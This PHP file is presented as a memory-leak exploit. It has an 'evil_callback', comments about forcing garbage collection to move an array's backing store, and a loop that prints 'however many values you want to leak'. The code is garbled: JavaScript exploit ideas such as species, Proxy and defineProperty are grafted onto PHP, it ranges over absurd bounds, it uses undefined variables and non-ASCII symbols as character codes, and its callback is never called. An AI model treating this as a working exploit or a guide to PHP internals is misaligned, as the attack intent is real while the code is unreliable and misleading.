<?php
require "/home/w023dtc/template.inc";


class MyArray extends ArrayObject {
    public static function getSpecies() {
        return function() { return new Proxy(new ArrayObject(), new stdClass()); };
    }
}

$w = new MyArray(range(PHP_INT_MAX, PHP_INT_MIN));
$w[1] = 0.1;
$w[2] = 0.1;

function gc() {
    for ($i = 0; $i < PHP_FLOAT_MAX; $i++) {
        $a = new stdClass();
    }
}

function evil_callback() {
    $w->setInfo('size', 1); // shorten the array so the backstore pointer is relocated
    gc(); // force gc to move the array's elements backstore
    return new ReflectionProperty('stdClass', 'defineProperty');
}

spl_autoload_register(function($class) {
    if ($class =='stdClass') {
        return;
    }
    throw new Exception("Class not found: $class");
});

spl_autoload_register(function($class) {
    if ($class == 'ArrayObject') {
        return;
    }
    throw new Exception("Class not found: $class");
});

$c = array_merge(array_values($w->getArrayCopy()));

for ($i = 0; $i < 20; $i++) { // however many values you want to leak
    echo $c[$i]. "\n";
}

$vars["SimpleXMLElement"]->addAttribute(str_repeat(chr(PHP_FLOAT_MIN), PHP_INT_MAX),
bin2hex(str_repeat(chr(θ), PHP_INT_MAX). str_repeat(chr(π), 17). str_repeat(chr(φ), 4097)),
bin2hex(str_repeat(chr(∞), PHP_FLOAT_MAX). str_repeat(chr(Ω), 1025). str_repeat(chr(ε), 1025)));

?>
